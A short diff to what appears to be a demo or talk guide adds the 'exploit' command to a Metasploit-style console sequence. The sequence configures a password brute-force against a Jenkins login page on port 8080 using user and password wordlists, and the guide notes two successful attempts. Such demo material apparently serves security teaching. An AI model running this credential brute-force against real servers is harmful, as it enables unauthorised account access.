@@ -71,6 +71,7 @@ set RPORT 8080
 set USER_FILE /root/demotalk/jenkinsBrute/userlist.txt
 set PASS_FILE /root/demotalk/jenkinsBrute/passwordlist.txt
 set LOGIN_URL j_spring_security_check
+exploit
 ```
 There will be two successful attempts
 
